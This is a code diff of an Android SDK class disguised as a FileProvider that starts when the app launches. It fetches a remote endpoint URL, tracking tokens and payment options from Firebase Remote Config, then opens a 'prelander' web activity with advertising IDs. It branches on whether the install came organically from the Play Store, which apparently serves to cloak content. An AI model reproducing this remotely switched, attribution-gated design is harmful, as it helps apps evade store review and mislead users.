@@ -1,14 +1,11 @@
 package com.ma.awsdk;
 
-import static com.ma.awsdk.utils.Utils.fixUrl;
 import static com.ma.awsdk.utils.Utils.getElapsedTimeInSeconds;
 
 import android.app.Activity;
 import android.app.Application;
 import android.content.Intent;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
 import android.os.RemoteException;
 
 import androidx.annotation.NonNull;
@@ -24,47 +21,45 @@ import com.android.installreferrer.api.ReferrerDetails;
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.analytics.FirebaseAnalytics;
 import com.google.gson.Gson;
-import com.ma.awsdk.models.DynamoCF;
 import com.ma.awsdk.models.Params;
+import com.ma.awsdk.models.Payments;
 import com.ma.awsdk.observer.DynURL;
 import com.ma.awsdk.observer.Events;
 import com.ma.awsdk.observer.URLObservable;
 import com.ma.awsdk.ui.AppFileActivity;
+import com.ma.awsdk.ui.PrelanderActivity;
 import com.ma.awsdk.utils.Constants;
+import com.ma.awsdk.utils.FirebaseConfig;
 import com.ma.awsdk.utils.Utils;
 
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 import org.greenrobot.eventbus.ThreadMode;
 
-import java.io.IOException;
-
-import okhttp3.Call;
-import okhttp3.Callback;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
-
 public class Bandora extends FileProvider implements Application.ActivityLifecycleCallbacks {
     public static final String TAG = "BANDORA";
     public int activitiesCounter = 0;
     public boolean isLaunched = false;
+    public boolean remoteConfigIsLaunched = false;
     public Params webParams = new Params();
-    private long SPLASH_TIME = 0;
     public Long timestamp;
     URLObservable ov;
     InstallReferrerClient referrerClient;
     Activity finalActivity;
 
+    FirebaseConfig fc ;
+
     @Override
     public boolean onCreate() {
+
+        timestamp = System.nanoTime();
+
         FirebaseApp.initializeApp(getContext());
-        initAdjust();
-        getGoogleInstallReferrer();
+
         Application app = (Application) Utils.makeContextSafe(getContext());
         app.registerActivityLifecycleCallbacks(this);
 
-        callDynamoURL();
+        getGoogleInstallReferrer();
 
         ov = new URLObservable();
         EventBus.getDefault().register(this);
@@ -80,14 +75,41 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
     @Override
     public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {
         finalActivity = activity;
+
+        if(!remoteConfigIsLaunched){
+            remoteConfigIsLaunched = !remoteConfigIsLaunched;
+            getRemoteConfig();
+        }
+
         if (activitiesCounter == 1 && !isLaunched) {
             ov.api_should_start(Events.MAIN_ACTIVITY_LAUNCHED);
         }
         activitiesCounter++;
     }
 
+    private void getRemoteConfig(){
+        fc = FirebaseConfig.getInstance();
+        fc.fetchVaues(finalActivity, () -> {
+
+            try {
+                callURL();
+                initAdjust();
+
+                Gson gson = new Gson();
+                fc.payments = gson.fromJson(fc.payment_options, Payments[].class);
+
+                ov.api_should_start(Events.FIREBASE_REMOTE_CONFIG);
+
+            } catch (Exception e) {
+                Utils.logEvent(getContext(), Constants.firbase_remote_config_fetch_errror, "");
+                e.printStackTrace();
+            }
+        });
+
+    }
+
     private void initAdjust() {
-        String appToken = getContext().getString(R.string.adjust_token);
+        String appToken = fc.adjust_token;
         String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
         AdjustConfig config = new AdjustConfig(getContext(), appToken, environment);
 
@@ -109,7 +131,6 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         Adjust.getGoogleAdId(getContext(), googleAdId -> webParams.setGoogleAdId(googleAdId));
         Adjust.onCreate(config);
 
-        timestamp = System.nanoTime();
         Adjust.addSessionCallbackParameter("user_uuid", Utils.generateClickId(getContext()));
         String versionCode = BuildConfig.VERSION;
         Adjust.addSessionCallbackParameter("m_sdk_version", versionCode);
@@ -118,7 +139,7 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         try {
             FirebaseAnalytics.getInstance(getContext()).getAppInstanceId().addOnCompleteListener(task -> {
                 webParams.setFirebaseInstanceId(task.getResult());
-                AdjustEvent adjustEvent = new AdjustEvent(getContext().getString(R.string.f_event_token));
+                AdjustEvent adjustEvent = new AdjustEvent(fc.f_event_token);
                 adjustEvent.addCallbackParameter("eventValue", task.getResult());
                 adjustEvent.addCallbackParameter("user_uuid", Utils.generateClickId(getContext()));
                 Adjust.trackEvent(adjustEvent);
@@ -178,95 +199,51 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         }
     }
 
-    public void callDynamoURL() {
-        OkHttpClient client = new OkHttpClient();
-        Request request = new Request.Builder()
-                .url(fixUrl(getContext().getString(R.string.finalEndp)) + "/?package=" + getContext().getPackageName())
-                .build();
+    public void callURL() {
 
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {
-                Utils.logEvent(getContext(), Constants.init_dynamo_error, "");
-                AppMainActivity();
+        String endURL = fc.finalEndp;
+
+        if (endURL != null && !endURL.equals("")) {
+            Constants.showAds = false;
+            if (endURL.startsWith("http")) {
+                Constants.setEndP(getContext(), endURL);
+            } else {
+                Constants.setEndP(getContext(), "https://" + endURL);
             }
-
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-
-                String myResponse = response.body().string();
-
-                try {
-                    Gson gson = new Gson();
-                    DynamoCF m = gson.fromJson(myResponse, DynamoCF.class);
-
-                    if (m != null & m.getCf() != null) {
-
-                        Utils.logEvent(getContext(), Constants.init_dynamo_ok, "");
-
-                        String fileResult = null;
-                        try {
-                            fileResult = m.getCf();
-
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
-                        if (fileResult != null && !fileResult.equals("")) {
-                            Constants.showAds = false;
-                            if (fileResult.startsWith("http")) {
-                                Constants.setEndP(getContext(), fileResult);
-                            } else {
-                                Constants.setEndP(getContext(), "https://" + fileResult);
-                            }
-
-                            try {
-                                if (m.getSecond() != null) {
-                                    SPLASH_TIME = 0;
-
-                                    try {
-                                        SPLASH_TIME = Integer.parseInt(m.getSecond());
-                                    } catch (NumberFormatException nfe) {
-                                        System.out.println("Could not parse " + nfe);
-                                    }
-                                }
-                            } catch (Exception e) {
-                                e.printStackTrace();
-                            }
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                ov.api_should_start(Events.DYNAMO);
-                            }, SPLASH_TIME);
-
-                        } else {
-                            AppMainActivity();
-                        }
-                    } else {
-                        Utils.logEvent(getContext(), Constants.init_dynamo_ok_empty, "");
-                        AppMainActivity();
-                    }
-
-                } catch (Exception e) {
-                    Utils.logEvent(getContext(), Constants.init_dynamo_ok_exception, "");
-                    AppMainActivity();
-                }
-            }
-        });
+        }
     }
 
     public void runApp() {
-        Utils.logEvent(getContext(), Constants.sdk_start + "_in" + getElapsedTimeInSeconds(timestamp), "");
-        Intent intent = new Intent(getContext(), AppFileActivity.class);
+
+        Utils.logEvent(getContext(), Constants.sdk_start + "_in"  , Long.toString(getElapsedTimeInSeconds(timestamp)));
+
+//        Intent intent = new Intent(getContext(), AppFileActivity.class);
+//        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//        intent.putExtra("webParams", webParams);
+//        getContext().startActivity(intent);
+
+        Intent intent = new Intent(getContext(), PrelanderActivity.class);
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.putExtra("webParams", webParams);
+        getContext().startActivity(intent);
+
 
         String attribution = webParams.getGoogleAttribution();
         if (!BuildConfig.DEBUG) {
             if (attribution == null || attribution.isEmpty() || attribution.toLowerCase().contains("organic") || attribution.toLowerCase().contains("play-store")) {
                 Utils.logEvent(getContext(), Constants.sdk_stopped_organic, "");
                 Utils.logEvent(getContext(), Constants.open_native_app_organic , "");
+
+                Intent pintent = new Intent(getContext(), PrelanderActivity.class);
+                pintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                pintent.putExtra("webParams", webParams);
+                getContext().startActivity(pintent);
+
+
                 return;
             }
         }
-        getContext().startActivity(intent);
+       // getContext().startActivity(intent);
     }
 
     public void AppMainActivity() {
